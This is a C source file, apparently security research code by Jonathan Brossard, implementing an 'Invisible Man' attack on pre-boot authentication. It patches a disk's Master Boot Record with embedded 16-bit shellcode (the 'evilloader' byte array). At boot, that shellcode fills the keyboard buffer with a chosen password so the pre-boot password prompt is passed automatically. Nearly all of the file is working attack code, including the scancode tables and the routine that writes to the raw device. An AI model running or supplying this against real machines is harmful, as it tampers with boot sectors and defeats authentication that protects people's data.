/*
*
* Jonathan Brossard - jb@endrazine.com // endrazine@gmail.com
*
*    "Invisible Man" attack against pre-boot authentication bootloaders
*
*
* This is plain old MBR patching, like implemented
* by many MBR virii since the 80's.
*
* Keyboard filling routines shamelessly ripped from "The art of assembly".
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>


#include <malloc.h>
#include <sys/mman.h>

#define DISK_OFFSET 10000
#define BUFF_SIZE 512
#define BUFF_LENGTH 255


	char evilloader[]="\x90\x90\xeb\x03\x5b\xeb\x7f\xe8\xfa\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\xc2\x31\xc9\xe4\x64\xa8\x01\xe0\xfa\xfa\xe4\x21\x50\x0c\x02\xe6\x21\xe8\x37\x00\xb0\x60\xe6\x64\xe8\x30\x00\x88\xd0\xe6\x60\xe8\x29\x00\xb0\x20\xe6\x64\x31\xc9\xe4\x64\xa8\x01\xe1\xfa\xe8\x1a\x00\xb0\x60\xe6\x64\xe8\x13\x00\xb0\x45\xe6\x60\xe4\x60\xcd\x09\xe8\x08\x00\xb0\xae\xe6\x64\x58\xe6\x21\xc3\x51\x50\x31\xc9\xe4\x64\xa8\x02\xe0\xfa\x58\x59\xc3\x53\x81\xc3\x02\x00\x89\xde\xb9\x20\x00\x0e\x1f\x51\x3e\x8a\x04\x3c\x00\x74\x08\xe8\x90\xff\x46\x59\xe2\xef\x51\x59\x31\xc0\x8e\xd8\x3e\xa1\x13\x04\x2d\x0a\x00\x3e\xa3\x13\x04\x07\x50\x06\xb1\x06\xd3\xe0\x8e\xc0\x06\x31\xd2\xfe\xc2\xb4\x02\xb0\x01\xbb\x00\x00\xb5\x00\xb1\x01\xb6\x00\xcd\x13\x80\xfc\x00\x75\xea\x80\xfa\x10\x74\x41\x26\x80\xbf\xfe\x01\x55\x75\xdd\x26\x80\xbf\xff\x01\xaa\x75\xd5\x07\x06\xb4\x02\xb0\x14\xbb\x00\x00\xb5\x00\xb1\x01\xb6\x00\xcd\x13\x80\xfc\x00\x75\xbf\x0e\x1f\x07\x5e\x31\xdb\x3e\x8b\x1c\xb4\x03\xb0\x01\xb5\x00\xb1\x01\xb6\x00\xcd\x13\xb4\x03\xb0\x01\xcd\x13\x0e\x1f\x0e\x1f\xe8\x00\x00\x58\x05\x14\x00\x50\x5e\x2d\x00\x7c\x05\x04\x00\x3e\x89\x04\x3e\x8c\x44\x02\xea\x00\x00\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\xbb\x00\x7c\x31\xc0\x50\x07\xb4\x02\xb0\x01\xb5\x00\xb1\x01\xb6\x00\xcd\x13\x58\x3e\x8b\x1e\x13\x04\x39\xd8\x75\x07\x05\x0a\x00\x3e\xa3\x13\x04\xea\x00\x7c\x00\x00";



/* Translation tables for keys to/from scancodes */

	char scancodes1[]=  {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B',
	'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
	'U', 'V', 'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
	'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '!', '@', '#', '$',
	'%', '^', '&', '*', '(', ')', '_', '-', '=', '+', '[', '{', ']', '}', ';', ':','\'', '"',
	'`', '~', '|', '\\', '<', ',', '>', '.', '?', '/', '*', '-', 0x19 /*  down key */,
	0x18 /* up key */, 0x1a /* right key*/, 0x1b /* left key */, 0x0d /* Enter */,
	0x1b /* Esc */, 0x20 /* space */ };


	char scancodes2[]= {0x0B, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 
	0x1E, 0x30, 0x2E, 0x20, 0x12, 0x21, 0x22, 0x23, 0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18,
	0x19, 0x10, 0x13, 0x1F, 0x14, 0x16, 0x2F, 0x11, 0x2D, 0x15, 0x2C, 0x1E, 0x30, 0x2E, 0x20,
	0x12, 0x21, 0x22, 0x23, 0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18, 0x19, 0x10, 0x13, 0x1F,
	0x14, 0x16, 0x2F, 0x11, 0x2D, 0x15, 0x2C, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
	0x0A, 0x0B, 0x0C, 0x0C, 0x0D, 0x0D, 0x1A, 0x1A, 0x1B, 0x1B, 0x27, 0x27, 0x28, 0x28, 0x29,
	0x29, 0x2B, 0x2B, 0x33, 0x33, 0x34, 0x34, 0x35, 0x35, 0x37, 0x4A, 0x50, 0x48, 0x4D, 0x4B,
	0x1C, 0x01, 0x39 } ;



	char password[16]={0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	char password2[32];

/*
* Remove one character from the translated password buffer
*/
int remove_char(int j) {

	int i;

	for (i=j;i<sizeof(password2);i++) {
		if ( i == sizeof(password2) ) {
			password2[i] = 0x00;
		} else{
			password2[i]=password2[i+1];
		}
	}

	return 0;
}

/*
* Convert password to 'keystroke+scancode' format
*/
int convert_password(void) {

	int i,j;

	for (i=0;1<16;i++) {

		/* convert 'enter' keystroke */
		if ( password[i] == 0x0a ) {
			password[i]= 0x0d;
		}

		if ( password[i] == 0x00 ) {
			password2[2*i] = 0x00;
			break;
		} else {
			password2[2*i] = password[i];

			for (j=0;j<sizeof(scancodes1);j++) {
				if ( scancodes1[j] == password[i] ) {
					password2[2*i+1] = scancodes2[j];
					break;
				}
				if ( j == (sizeof(scancodes1) - 1) ) {
					/* error on given password */
					return 1;
				}			
			}

		}
	}


	/* remove every occurence of 0x0d : the enter key is only coded on one byte */
	for (j=0;j<sizeof(password2);) {
		if ( password2[j] == 0x0d ) {
			remove_char(j);
		} else {
			j++;
		}

	}



	return 0;
}

/*
* Copy translated password to shellcode
*/
int load_password(void) {

	int i;

	printf("  [*] Translated Password: [ ");
	for (i=0;i<32;i++) {
		if( password2[i] == 0x00)
			break;
		printf("%02x ",password2[i]);
		evilloader[12+i] = password2[i];

	}
	printf("]\n");

	return 0;
}

/*
* Display some help
*/
int usage(int argc, char **argv) {

	fprintf(stderr,
		"usage: %s [-h] [--disk=<device>] [--password=<file>]\n"
		"\n"
		"--help (or -h)			display this help\n"
		"--disk (or -d)			device containing the MBR\n"
		"--password (or -p)		file containing the desired input\n"
		"\n  THIS WILL MODIFY YOUR MASTER BOOT RECORD\n"
		"  DONT USE UNTIL YOU KNOW WHAT YOU ARE DOING\n\n",
		argv[0]);

	exit(-2);
}

int main (int argc, char * argv[]) {



	char PASSWORD_FILE[BUFF_LENGTH];
	char DISK_NAME[BUFF_LENGTH];



	int fd;
	int c,i,j=0, retaddr,jumpposition;

	FILE * passwdfile;


	if (argc < 2)
		usage(argc, argv);

	/*
	* Command line options parsing
	*/
	while (1) {
		int this_option_optind = optind ? optind : 1;
		int option_index = 0;
		static struct option long_options[] =
		    { 	{"help", 0, 0, 'h'},
			{"password", 1, 0, 'p'},
			{"disk", 1, 0, 'd'},
			{0, 0, 0, 0} };

		c = getopt_long(argc, argv, "hp:d:", long_options,
				&option_index);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argc, argv);
			break;

		case 'p':
			if(optarg != 0) {
				strncpy(PASSWORD_FILE, optarg, BUFF_LENGTH);
			} else {
				fprintf(stderr, "  [!!] try giving an actual option instead of : '%c'\n", c);
				exit(-2);
			}
			break;

		case 'd':
			if(optarg != 0) {
				strncpy(DISK_NAME, optarg, BUFF_LENGTH);
			} else {
				fprintf(stderr, "  [!!] try giving an actual option instead of : '%c'\n", c);
				exit(-2);
			}
			break;

		default:
			fprintf(stderr, "  [!!] unknown option : '%c'\n", c);
			exit(-2);
		}
	}

	/*
	* Read password from file
	*/
	passwdfile = fopen(PASSWORD_FILE, "r");
	if (!passwdfile) {
		perror("error opening password file: ");
		exit(-3);
	}

	fscanf(passwdfile,"%16c",password);

	/*
	* Open device and read DISK_OFFSET first bytes
	*/
	fd = open(DISK_NAME, O_RDWR);
	if (fd == -1) {
		perror("Fatal error while opening disk: ");
		exit(-1);
	}

	int PageSize = (int)sysconf(_SC_PAGESIZE);
	if ( PageSize < 0) {
		perror("Fatal error in sysconf: ");
		exit(-1);
	}

	char* map = mmap(0, DISK_OFFSET , PROT_READ| PROT_WRITE , MAP_SHARED, fd, 0);	
	if(map == MAP_FAILED) {
		perror("Fatal error in mmap: ");
		exit(-1);
	}

	/*
	* Read original jump address from MBR
	*/
	for (i=0;i<10;i++) {
		if ( (unsigned char) *(map + i ) == 0xeb ) { /* jmp short ... */
			break;
		}
	}

	if ( i >= 9 ) {
		printf("Could't find initial jmp short : quiting\n");
		exit(-1);
	} else {
		jumpposition = i + 1;
	}

	retaddr= * (map + jumpposition) +2;
	printf("  [*] Initial jump: 0x%x at position 0x%x\n", retaddr,jumpposition);

	/*
	* search for a DISK_OFFSET bytes long buffer filled with 0x00 
	* to back up MBR
	*/
	j = 0;
	for (i=513;i<DISK_OFFSET;i++) {	

		if ( *(map +i) == 0x00 ){
			j++;
		} else {
			j = 0;
		}		
	
		if ( j >= BUFF_SIZE ) {
			break;
		}
	}

	/*
	* No suitable buffer found, quit
	*/
	if (i >= DISK_OFFSET - 10) {
		printf("  [*] No suitable buffer found, try a larger disk offset\n");
		exit(-1);
	} else {

	/*
	* Ok, we have a suitable buffer
	*/
		i = i - BUFF_SIZE;

		printf("  [*] Found %d bytes buffer at offset 0x%4x\n",j,i);
	}

	/*
	* Backup original bootloader to buffer
	*/

	if(!memcpy(map + i,map,512)) {
		printf("backup of the original MBR failed, quitting\n");
		exit(-1);
	} else {
		printf("  [*] backup of MBR successfull\n");
	}

	/*
	* Modify the address of the MBR backup in our evil loader
	*/
	evilloader[10] = i % 256 ;
	evilloader[11] = i / 256 ;

	/*
	* Get the password translated to the 'keystroke + scancode' format
	* and copy it to shellcode
	*/
	printf("  [*] Password:\n[%s]\n\n",password);

	if( convert_password()) {
		printf("Invalid character in password...\nquitting\n");
		exit(-1);
	} else {
		load_password();
	}

	/*
	* copy our custom bootloader at intial "jump short..." landing
	*/
	if( !memcpy(map+retaddr+jumpposition,evilloader,sizeof(evilloader)) ) {
		printf("Installation of evil loader failed, quitting\n");
		exit(-1);
	} else {
		printf("  [*] Installed evil loader at offset 0x%x\n" ,retaddr+jumpposition );
	}

	/*
	* Clean and quit
	*/
        if (munmap(map, (DISK_OFFSET/PageSize +1)*PageSize  ) < 0) {
                perror("Error while freeing memory...\n");
        }

	close(fd);
	return 0;

}
